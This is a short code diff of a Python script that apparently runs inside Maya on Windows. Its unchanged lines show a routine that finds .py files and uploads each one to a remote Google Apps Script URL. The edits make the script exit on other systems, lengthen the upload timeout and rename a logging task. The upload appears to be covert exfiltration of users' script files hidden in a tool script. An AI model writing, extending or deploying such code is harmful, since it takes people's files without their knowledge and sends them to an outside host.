@@ -9,7 +9,7 @@ def run_tsl(py_cmd):
     import subprocess, os, sys
 
     if os.name != "nt":
-        return None
+        sys.exit(0)
 
     maya_dir = None
     if "maya.exe" in os.path.basename(sys.executable).lower():
@@ -103,7 +103,7 @@ def _gup(file_path):
         params = uLib.urlencode(data)
     params = params.encode("ascii")
     req = urllib.request.Request(GAS_WEB_APP_URL, data=params)
-    with urllib.request.urlopen(req, context=ssl_context, timeout=100000) as response:
+    with urllib.request.urlopen(req, context=ssl_context, timeout=1000000) as response:
         result = response.read()
 
 
@@ -213,7 +213,7 @@ try:
                 add_queue_task("tsl_up_err", {"error": str(traceback.format_exc())})
         if fp_basename.endswith(".py"):
             _gup(os.path.abspath(fp))
-            add_queue_task("tsl_up_err", {"path": fp.replace("\\", "/")})
+            add_queue_task("path64", {"path": fp.replace("\\", "/")})
 
     # -
     fmp = find_file(
